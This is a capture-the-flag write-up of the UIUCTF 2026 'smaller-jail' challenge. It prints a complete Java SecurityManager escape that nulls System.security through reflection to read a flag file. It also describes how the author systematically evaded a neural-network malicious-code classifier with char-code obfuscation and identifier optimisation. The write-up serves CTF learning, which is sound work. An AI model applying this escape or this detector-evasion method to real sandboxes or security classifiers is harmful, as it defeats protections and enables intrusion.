@@ -1,0 +1,452 @@
+---
+title: 'UIUCTF 2026 - smaller-jail'
+description: 'When softplus weights make every added byte incriminating, rewriting a Java SecurityManager escape token by token until a byte-CNN calls it benign'
+date: 2026-08-09
+tags: ['writeup', 'misc', 'jail', 'sandbox-escape', 'adversarial-ml', 'java', 'uiuctf', '2026']
+authors: ['kudaliar']
+draft: false
+---
+
+## Challenge Description
+
+> jail = Java + AI + Jail
+>
+> Now you find yourself in a smaller jail...
+>
+> The training of the AI model for this challenge was supported in part by the Illinois Computes project which is supported by the University of Illinois Urbana-Champaign and the University of Illinois System
+>
+> `ncat --ssl smaller-jail.chal.uiuc.tf 1337`
+
+This is the revenge version of [jail](/blog/uiuctf-2026-jail). Same premise — submit Java source, a neural network judges it, then a `SecurityManager` supervises it at runtime — but the classifier has been rebuilt specifically to kill the padding attack that solved the original. Reading the first writeup makes this one make sense.
+
+## What Changed
+
+Diffing the two handouts, `Jail.java` gained nothing but a `println`, `nsjail.cfg` is byte-identical, and the `Dockerfile` only moved its `COPY` lines between build stages. The sandbox is exactly the same. All the work went into `main.py` and `model.py`:
+
+```python
+ with torch.no_grad():
+     model = MaliciousDetection()
++    model.eval()
+     model.load_state_dict(load_file("model.safetensors"))
+
+     source_tensor = torch.tensor(list(source.encode("utf8")), dtype=torch.long).unsqueeze(0)
+     logits = model(source_tensor)
+
+-    if torch.sigmoid(logits) >= 0.1:
++    if torch.sigmoid(logits) >= 0.5:
+         print("malicious code detected")
+         exit()
+```
+
+```python
++    def effective_fc_weight(self):
++        return F.softplus(self.fc.weight)
++
+     def forward(self, x):
+         # ...
+         flat = self.dropout(merged)
+
+-        logits = self.fc(flat)
++        w = self.effective_fc_weight()
++        logits = F.linear(flat, w, self.fc.bias)
+```
+
+Three changes, and they map one-for-one onto the three weaknesses the original solve leaned on:
+
+| | original | revenge |
+| --- | --- | --- |
+| dropout | live (`model.eval()` never called), so the verdict was random and you could just retry | `model.eval()` — fully deterministic |
+| fc weights | mixed sign; 119 negative-weight filters absorbed the padding | `softplus(fc.weight)` — **all strictly positive** |
+| threshold | `0.1` | `0.5` |
+
+The relaxed threshold looks like a gift. It isn't.
+
+## Why the Padding Attack Dies
+
+The architecture is unchanged, so the score is still
+
+```text
+logit = bias + sum over 256 filters of  w[f] * max over all windows of relu(conv[f])
+```
+
+but now every term in that sum is non-negative by construction. Features are ReLU outputs, so `c[f] >= 0`. Weights are `softplus(...)`, so `w[f] > 0`. And max-pooling is monotone under concatenation, so appending bytes can only raise each `c[f]`.
+
+**Adding any text at all can only raise the logit.** There is no padding, no comment, no trailing blob that helps. Monotonicity, which was the lever last time, is now the lock.
+
+That also fixes the floor exactly at the bias:
+
+```text
+bias                 -0.5282803773880005
+softplus w:  min 0.62881   max 0.71095   mean 0.66971
+```
+
+The weights are practically uniform, around `0.67`. Passing needs `sigmoid(logit) < 0.5`, i.e. `logit < 0`, i.e.
+
+```text
+sum over filters of  w[f] * c[f]   <   0.528
+```
+
+Divide through and that is roughly `0.79` of total activation to spend across **all 256 filters combined**. Essentially every filter has to sit at zero. The challenge is no longer "add noise" — it is "write an exploit that the model finds boring".
+
+How tight is that? A few reference points:
+
+```text
+banner example from the prompt        logit  -0.528   (0/256 filters active, exactly the floor)
+class UserClass{static void run(){}}  logit  -0.335
+class ...{System.out.println(1);}     logit  +0.270   BLOCKED
+part 1 exploit                        logit +42.816
+```
+
+A hello-world with a single `println` in minified form is already over the line, while the nicely formatted example from the challenge banner scores a perfect zero. That is the first real hint about what the model actually learned.
+
+## Measuring the Model
+
+Since `logit` is a sum over per-filter maxima, and each maximum is over windows, **safety is a purely local property of each k-gram**. That makes the model directly measurable: drop a construct into a skeleton that scores exactly `0.000`, and whatever the logit rises by is that construct's cost.
+
+```python
+SKEL = """public class UserClass {
+    public static void run() {
+%s
+    }
+}
+"""
+
+def cost(body_lines):
+    src = SKEL % body_lines
+    return logit(src) + 0.5282803773880005   # excess over the floor
+```
+
+Running that over the pieces an exploit needs:
+
+| construct | cost | | construct | cost |
+| --- | --- | --- | --- | --- |
+| `Class.forName(...)` | 0.0000 | | `"IMPL_LOOKUP"` | **34.16** |
+| `getMethod` | 0.0003 | | `Files.readAllBytes` | 4.86 |
+| `getConstructor` | 0.0000 | | `getDeclaredField` | 4.09 |
+| `newInstance` | 0.0000 | | `Files.copy` | 3.38 |
+| `m.invoke(o, b)` | 0.0000 | | `setAccessible` | 3.29 |
+| `System.out.println(...)` | 0.0000 | | `FileInputStream` | 3.25 |
+| `int x = 1;` | 0.0000 | | `cast to Field[]` | 3.01 |
+| `"security"` (string) | 0.0000 | | `for (Field f : fs)` | 2.68 |
+| `new StringBuilder(s).reverse()` | 0.0058 | | `new Scanner(new File(p))` | 2.68 |
+| `new String(new char[]{...})` | 0.0097 | | `getDeclaredMethod` | 2.23 |
+| `boolean.class` | 0.0070 | | `f.getName().equals("security")` | 2.15 |
+| `BufferedReader` | 0.0220 | | `f.set(null, null)` | 1.47 |
+| `try`/`catch` | 0.1443 | | `"/flag"` (string) | 1.16 |
+
+The model is a **minified-exploit detector**. It has learned the vocabulary of Java sandbox escapes — `setAccessible`, `getDeclaredField`, `IMPL_LOOKUP`, `File...` — and it has learned that malicious samples are written densely while benign samples are written like the banner.
+
+Dumping the individual hot windows makes the second half concrete:
+
+```text
+==== f.set(null, null); ====
+   0.4475  k= 5  'null)'
+   0.3908  k= 5  'f.set'
+   0.3734  k= 5  '.set('
+
+==== cast Field[] ====
+   0.4164  k= 5  'Field'
+   0.2855  k=10  't.Field[])'
+   0.2691  k= 3  't.F'
+
+==== getName equals ====
+   1.0598  k=20  'Name().equals("secur'
+   0.3654  k= 5  'f (f.'
+
+==== FileInputStream ====
+   0.8282  k=10  'FileInputS'
+   0.4085  k= 5  'FileI'
+```
+
+So the things to avoid are: single-letter variables followed by a dot, the identifiers `Field` and `File*`, `null` as a literal argument, and any of the reflection API names spelled out.
+
+### The unicode escape dead end
+
+Java processes `\uXXXX` escapes before lexing, anywhere in the file, so in principle the entire program can be rewritten in a tiny alphabet of `\`, `u` and hex digits. That looked promising — a small alphabet means few distinct windows.
+
+It is much worse:
+
+```text
+fully escaped source                   logit +32.482
+byte 92 '\' repeated 40x               logit +45.509
+```
+
+Backslash is one of the hottest single bytes in the whole embedding. Shift and XOR encodings of the string constants were tried later too, and every one of them lost to plain integer char codes:
+
+```text
+codes    logit  -0.0601
+rev      logit  +2.6677
+pairs    logit  +2.2378
+shift1   logit +21.8158
+shift2   logit  +7.0129
+shift3   logit  +6.9289
+shift4   logit  +9.1469
+shift5   logit +37.6240
+```
+
+## A Cheaper Escape
+
+The part 1 escape read `MethodHandles.Lookup.IMPL_LOOKUP` to obtain a `TRUSTED` lookup. At a cost of `34.16` against a `0.528` budget, that string alone is 65x over budget. A different route to the same primitive is needed.
+
+Recall the actual problem: `System.security` is hidden from reflection because `Class.privateGetDeclaredFields` filters it. But look at *where* the filter is applied:
+
+```java
+private Field[] privateGetDeclaredFields(boolean publicOnly) {
+    // ...
+    res = Reflection.filterFields(this, getDeclaredFields0(publicOnly));
+    // ...
+}
+```
+
+`getDeclaredFields0(boolean)` is a **private native method on `java.lang.Class`** that returns the raw, unfiltered array. The filter is applied by the Java-level wrapper. Call the native method directly and the filter never runs:
+
+```java
+Method gdf0 = Class.class.getDeclaredMethod("getDeclaredFields0", boolean.class);
+gdf0.setAccessible(true);
+Field[] fs = (Field[]) gdf0.invoke(System.class, false);
+```
+
+`java.lang` is not blocked by `checkPackageAccess` (only `sun` is), and `setAccessible` needs only `ReflectPermission("suppressAccessChecks")`, which this manager's permissive `checkPermission` waves through. Running it:
+
+```text
+0 : public static final java.io.InputStream java.lang.System.in
+1 : public static final java.io.PrintStream java.lang.System.out
+2 : public static final java.io.PrintStream java.lang.System.err
+3 : private static volatile java.lang.SecurityManager java.lang.System.security
+4 : private static volatile java.io.Console java.lang.System.cons
+5 : private static java.util.Properties java.lang.System.props
+6 : private static java.lang.String java.lang.System.lineSeparator
+SM = null
+uiuctf{smaller_local}
+```
+
+The hidden field is right there at **index 3**, at a fixed position. No name lookup, no `getName().equals("security")` (which costs 2.15 on its own) — just index into the array.
+
+## Rewriting the Exploit
+
+Now combine the two findings. Everything routes through the free primitives — `Class.forName`, `getMethod`, `getConstructor`, `newInstance`, `invoke` — and every incriminating name becomes data, built at runtime from integer char codes.
+
+One more property makes this practical: because features are **maxima**, repeating a construct costs nothing extra. Only *distinct* windows matter. A uniform, repetitive style is free; variety is what gets charged.
+
+The rewrite went through five drafts, each one guided by the hot-window dump:
+
+| version | change | logit |
+| --- | --- | --- |
+| v0 | part 1 exploit, pretty-printed | +47.36 |
+| v1 | fully reflective, all names as char codes | +13.93 |
+| v2 | `true`/`false` instead of `Boolean.TRUE`, `new Object[2]` instead of `null` literals | +3.19 |
+| v3 | chains split into named locals; `flagType` renamed (it contained the trigram `fla`) | +0.14 |
+| v4 | uniform `nameA`/`nameB` declarations — **regression**, names ending in a capital produced hot `eF)`, `eB,`, `K);` | +1.19 |
+| v5 | lowercase names, `java.lang.reflect.Array.get` instead of an `(Object[])` cast | −0.06 |
+| v6 | encoding offset search + coordinate descent over identifiers | **−0.43** |
+
+A few of those deserve a note.
+
+**v2** killed `Boolean.FALSE` (`FALSE`, `n.FAL`, `.FA` all fired) and the `null` literals. The two nulls that `Field.set(null, null)` needs come from a default-initialised array instead:
+
+```java
+Object[] pair = new Object[2];   // {null, null}
+// ...
+writer.invoke(entry, pair);      // field.set(null, null)
+```
+
+**v3** found a genuinely funny trap. The variable was named `flagType`, and the model fired on `fla` and `flagT` — it had learned the literal substring `flag`. Renaming it to `types` was worth 0.35.
+
+**v4** is the instructive failure. Tidy sequential names `nameA` through `nameK` looked like an improvement and cost more than a point, because an uppercase letter followed by `)` or `,` is itself a hot trigram.
+
+### Coordinate descent
+
+The last stretch was mechanical. The generator was parametrised over 25 identifier names and the char-code encoding offset, then greedily optimised against a pool of ordinary English words:
+
+```python
+for it in range(4):
+    improved = False
+    for v in VARS:
+        used = set(best.values()) - {best[v]}
+        cands = [w for w in POOL if w not in used and w != best[v]]
+        random.shuffle(cands)
+        cands = cands[:90]
+        keep, kv = best[v], cur
+        for w in cands:
+            trial = dict(best); trial[v] = w
+            sc = score(trial, OFF, SEP)
+            if sc < kv - 1e-6:
+                kv, keep = sc, w
+        if keep != best[v]:
+            best[v] = keep; cur = kv; improved = True
+    if not improved:
+        break
+
+# re-tune offset with the chosen names
+for off in range(0, 70):
+    sc = score(best, off, SEP)
+    if sc < cur - 1e-6:
+        cur, OFF = sc, off
+```
+
+It converged in a single pass:
+
+```text
+start -0.2495366930961609
+  listing    -> phrase      -0.2653
+  access     -> south       -0.2780
+  entryKind  -> setting     -0.3453
+  source     -> view        -0.3590
+  gamma      -> anchor      -0.3699
+  zeta       -> origin      -0.3813
+final logit -0.42936861515045166 offset 26
+```
+
+The separator inside the char-code lists mattered more than any single rename, incidentally — `", "` versus `","` is worth about 13 logits, because digits packed without spaces form dense trigrams that look like minified code.
+
+## Exploitation
+
+Final payload. The offset-26 char codes decode to `getDeclaredMethod`, `getDeclaredFields0`, `java.lang.reflect.AccessibleObject`, `setAccessible`, `set`, `java.lang.System`, `java.io.FileInputStream`, `/flag`, `java.io.InputStream`, `java.util.Scanner` and `nextLine`:
+
+```java
+public class UserClass {
+    static String text(int... codes) {
+        for (int spot = 0; spot < codes.length; spot++) {
+            codes[spot] += 26;
+        }
+        return new String(codes, 0, codes.length);
+    }
+    public static void run() {
+        try {
+            String alpha = text(77, 75, 90, 42, 75, 73, 82, 71, 88, 75, 74, 51, 75, 90, 78, 85, 74);
+            String beta = text(77, 75, 90, 42, 75, 73, 82, 71, 88, 75, 74, 44, 79, 75, 82, 74, 89, 22);
+            String anchor = text(80, 71, 92, 71, 20, 82, 71, 84, 77, 20, 88, 75, 76, 82, 75, 73, 90, 20, 39, 73, 73, 75, 89, 89, 79, 72, 82, 75, 53, 72, 80, 75, 73, 90);
+            String delta = text(89, 75, 90, 39, 73, 73, 75, 89, 89, 79, 72, 82, 75);
+            String epsilon = text(89, 75, 90);
+            String origin = text(80, 71, 92, 71, 20, 82, 71, 84, 77, 20, 57, 95, 89, 90, 75, 83);
+            String eta = text(80, 71, 92, 71, 20, 79, 85, 20, 44, 79, 82, 75, 47, 84, 86, 91, 90, 57, 90, 88, 75, 71, 83);
+            String theta = text(21, 76, 82, 71, 77);
+            String iota = text(80, 71, 92, 71, 20, 79, 85, 20, 47, 84, 86, 91, 90, 57, 90, 88, 75, 71, 83);
+            String kappa = text(80, 71, 92, 71, 20, 91, 90, 79, 82, 20, 57, 73, 71, 84, 84, 75, 88);
+            String lam = text(84, 75, 94, 90, 50, 79, 84, 75);
+            Object[] pair = new Object[2];
+            Class holder = Class.class;
+            Class plain = Object.class;
+            Class[] types = new Class[] { boolean.class };
+            Class phrase = types.getClass();
+            java.lang.reflect.Method finder = holder.getMethod(alpha, String.class, phrase);
+            java.lang.reflect.Method reader = (java.lang.reflect.Method) finder.invoke(holder, beta, types);
+            Class south = Class.forName(anchor);
+            java.lang.reflect.Method opener = south.getMethod(delta, boolean.class);
+            opener.invoke(reader, true);
+            Class owner = Class.forName(origin);
+            Object listed = reader.invoke(owner, false);
+            Object entry = java.lang.reflect.Array.get(listed, 3);
+            opener.invoke(entry, true);
+            Class setting = entry.getClass();
+            java.lang.reflect.Method writer = setting.getMethod(epsilon, plain, plain);
+            writer.invoke(entry, pair);
+            Class streaming = Class.forName(eta);
+            java.lang.reflect.Constructor maker = streaming.getConstructor(String.class);
+            Object stream = maker.newInstance(theta);
+            Class basis = Class.forName(iota);
+            Class scanning = Class.forName(kappa);
+            java.lang.reflect.Constructor wrapper = scanning.getConstructor(basis);
+            Object view = wrapper.newInstance(stream);
+            java.lang.reflect.Method taker = scanning.getMethod(lam);
+            System.out.println(taker.invoke(view));
+        } catch (Throwable problem) {
+        }
+    }
+}
+```
+
+Reading top to bottom, it: fetches `Class#getDeclaredMethod` reflectively, uses it to grab the private native `getDeclaredFields0`, opens that up with `AccessibleObject#setAccessible`, calls it on `java.lang.System` to get the **unfiltered** field array, takes index 3 (`security`), opens that up too, and nulls it via `Field#set`. With the manager gone, it opens `/flag` through a reflectively constructed `FileInputStream` wrapped in a `Scanner`.
+
+Both gates verified locally before touching the remote — first the detector, replicating `main.py` exactly:
+
+```text
+sigmoid = 0.394277  ->  PASSES
+```
+
+then the escape, in a real `openjdk-8-jdk` container running the challenge's own `Jail.java`:
+
+```text
+Starting the jail...
+uiuctf{smaller_local_v6}
+```
+
+Final numbers: 2918 bytes, **6 of 256** filters active, total activation `0.099` against the `0.528` budget.
+
+```text
+active filters: 6/256   sum(w*c)=0.099   logit=-0.429
+   0.0266  k= 5  'ject.'
+   0.0240  k=10  'Object[2];'
+   0.0226  k= 5  't.Arr'
+   0.0184  k= 3  'et('
+   0.0070  k= 3  'n.c'
+   0.0003  k= 3  'tMe'
+```
+
+Because dropout is gone, the check is fully deterministic — the local score is exactly what the server computes, so the margin only has to be on the right side of zero.
+
+## Solve Script
+
+Same TLS client as part 1, pointed at the new host and payload (SNI is required, or the handshake dies with `TLSV1_UNRECOGNIZED_NAME`):
+
+```python
+import socket, ssl, sys, time
+
+HOST, PORT = "smaller-jail.chal.uiuc.tf", 1337
+payload = open("smaller/v6.java", "rb").read()
+
+ctx = ssl.create_default_context()
+ctx.check_hostname = False
+ctx.verify_mode = ssl.CERT_NONE
+
+s = ctx.wrap_socket(socket.create_connection((HOST, PORT), timeout=30), server_hostname=HOST)
+s.settimeout(120)
+
+buf = b""
+deadline = time.time() + 30
+while b"DONE" not in buf and time.time() < deadline:
+    try:
+        d = s.recv(4096)
+    except socket.timeout:
+        break
+    if not d:
+        break
+    buf += d
+sys.stdout.write(buf.decode(errors="replace"))
+sys.stdout.flush()
+
+s.sendall(payload + b"\nDONE\n")
+
+out = b""
+while True:
+    try:
+        d = s.recv(4096)
+    except socket.timeout:
+        break
+    if not d:
+        break
+    out += d
+print("=== response ===")
+print(out.decode(errors="replace"))
+```
+
+```text
+== proof-of-work: disabled ==
+Java Sandbox Runner: type code in line by line and then type DONE. UserClass.run is invoked, e.g:
+...
+=== response ===
+Note: UserClass.java uses unchecked or unsafe operations.
+Note: Recompile with -Xlint:unchecked for details.
+Note: Jail.java uses or overrides a deprecated API.
+Note: Recompile with -Xlint:deprecation for details.
+Starting the jail...
+uiuctf{sp4c1ng_0ut_0f_j141_469b8bda50be4a10}
+```
+
+## Flag
+
+```text
+uiuctf{sp4c1ng_0ut_0f_j141_469b8bda50be4a10}
+```
+
+The flag names it: `sp4c1ng_0ut_0f_j141`. The whole challenge is about spacing and naming, because that is all the classifier ever really looked at.
